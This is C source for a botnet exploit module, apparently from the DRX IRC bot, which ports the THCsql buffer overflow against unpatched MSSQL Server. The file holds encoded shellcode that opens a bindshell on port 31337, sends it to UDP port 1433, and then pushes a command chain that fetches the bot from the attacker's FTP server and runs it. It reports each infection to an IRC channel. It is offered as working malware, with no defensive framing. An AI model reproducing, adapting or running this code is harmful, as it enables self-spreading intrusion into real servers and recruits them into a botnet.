//***********************************************

//* THCsql 0.1 - MSSQL Server exploit for Server < SP3
//* Ported for DRX- bot by Woopie ( w00pie.nl )

//***********************************************

#include "../includes/includes.h"
#include "../includes/functions.h"
#include "../includes/externs.h"
#pragma comment(lib, "ws2_32.lib")

#ifndef NO_THCSQL

// exploit buffer ... bindshell at port 31337

char badbuffer[] =
"\x04"
"THCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHC"
"THCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHCTHC"
"\xdc\xc9\xb0\x42"
"\xeb\x0e"
"JC"
"THC!"
"\x01\x70\xae\x42"
"\x01\x70\xae\x42"
"\x8b\xfc\x83\xc7\x2c\x66\x81\xec\x04\x02\x33\xc9\xb2\x35\x66"
"\x81\xc1\x38\x01\x8a\x1f\x32\xda\x88\x1f\x47\xe2\xf7\xde\x16"
"\x4f\x5c\x37\x30\x59\x6c\xcd\x28\xa9\xeb\xb9\xe4\x79\x45\xe1"
"\x36\xc5\x12\x15\x15\x05\x3d\x62\x66\x07\x6a\x06\x07\x1b\x71"
"\x79\x79\x34\xde\x30\xdd\xcc\xca\xca\xca\x68\xb6\xd8\x1f\x5f"
"\x05\x6c\x51\xbe\x34\xbe\x75\x39\xbe\x45\x29\x98\xbe\x4d\x3d"
"\xb8\x6a\x09\xbe\x2e\x34\xce\xbe\x6e\x4d\x34\xce\xbe\x7e\x29"
"\x34\xcc\xbe\x66\x11\x34\xcf\x66\x64\x67\xbe\x6e\x15\x34\xce"
"\x04\xfc\x74\x04\xf5\xac\xbe\x01\xbe\x34\xcb\x99\x04\xf7\xe4"
"\xd7\xb1\xf5\x40\xc2\x3a\x83\x70\x30\xb8\x71\x70\x31\x53\x0c"
"\x25\x40\xd4\x53\x04\x25\x6f\x6d\x6b\x63\x65\x67\x1e\x7b\x25"
"\x74\x3a\x82\x39\x7f\xbe\x31\xbd\x34\xcd\x3a\x83\x78\x30\xbc"
"\x71\xb8\xed\xcb\x78\x30\x40\x8b\xcb\x78\x31\x41\x14\xcb\x78"
"\x17\xb8\x68\x2d\x66\xca\xe5\xbc\xf2\x5f\x31\x6d\xbd\x70\x30"
"\xb5\x70\x42\x3f\xb8\x68\x41\xb5\x5e\x13\x21\xdc\x4d\xca\xca"
"\xca\xbc\xfb\x04\xee\x66\x66\x66\x66\x63\x73\x63\xca\xe5\xa2"
"\x60\x6d\x53\xbc\x05\x5f\x25\x60\x62\xca\x60\xe1\x7b\x63\x62"
"\xca\x60\xf9\x66\x60\x62\xca\x60\xe5\xa2\xb8\x70\xbd\x65\xca"
"\x60\xd1\x60\x60\xca\x60\xdd\xb8\x71\x30\x39\xa1\x66\x5d\x1b"
"\x50\x4d\x50\x5d\x69\x56\x58\x51\xa1\x04\xe7\xb8\x70\xf9\xa1"
"\x62\x62\x62\x66\x66\xcb\xf3\x34\xc7\x67\xa1\xb8\x70\x4d\x65"
"\xb8\x70\xbd\x65\x84\x3d\x66\x66\x5f\x25\xcb\xfb\x67\x66\x66"
"\x66\x60\xca\x60\xd9\x5f\xca\xca\x60\xd5";

int tport = 31337;

bool ThsqlConnet(EXINFO exinfo) {

		int len;
		char recvbuf[1024];
		SOCKET sockfd;
		SOCKADDR_IN shell_addr;
		memset(&shell_addr, 0, sizeof(shell_addr));
		

		shell_addr.sin_family = AF_INET;
		shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip); // = *((LPIN_ADDR) * lpHostEntry->h_addr_list);
		shell_addr.sin_port = fhtons(tport);;

		if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET )
			return false;
		if (fconnect(sockfd, (LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
			return false;
		
		char mkdir_buff[400];

		len = frecv(sockfd, recvbuf, 1024, 0);

		_snprintf(mkdir_buff, sizeof (mkdir_buff),
		
		"echo open %s %d > o&echo user 1 1 >> o &echo get %s >> o &echo quit >> o &ftp -n -s:o &del /F /Q o &%s\r\n",
		GetIP(exinfo.sock),FTP_PORT, filename, filename);

		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		
		Sleep(500);
		_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);


		if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
			return false;
		len = frecv(sockfd, recvbuf, 1024, 0);

		fclosesocket(sockfd);
		return true;

}

BOOL Thcsql(EXINFO exinfo)
{  
  unsigned short sqlport=1433;
  unsigned int sock,addr,rc;
  struct sockaddr_in sqludp;
  struct hostent * hp;
  char buffer[IRCLINE];

  
  hp = gethostbyname(exinfo.ip);

  if (!hp){
   addr = inet_addr(exinfo.ip);
  }

  sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
  
  if (hp != NULL)
   memcpy(&(sqludp.sin_addr),hp->h_addr,hp->h_length);
  else
   sqludp.sin_addr.s_addr = addr;

  if (hp)
   sqludp.sin_family = hp->h_addrtype;
  else
   sqludp.sin_family = AF_INET;

  sqludp.sin_port=htons(sqlport);
 
  rc=connect(sock, (struct sockaddr *) &sqludp, sizeof (struct sockaddr_in));
  if(rc==0)
  {
    send(sock,badbuffer,sizeof(badbuffer)-1,0);
    Sleep(1000);
	if (ThsqlConnet(exinfo))
		return true;
	_snprintf(buffer, sizeof(buffer), "[%s]: wh00pwh00p attempting to spl0it: %s.", exploit[exinfo.exploit].name, exinfo.ip);
	irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;
	return false;
  }
  shutdown(sock,1);
  closesocket(sock);
  return TRUE;
}
#endif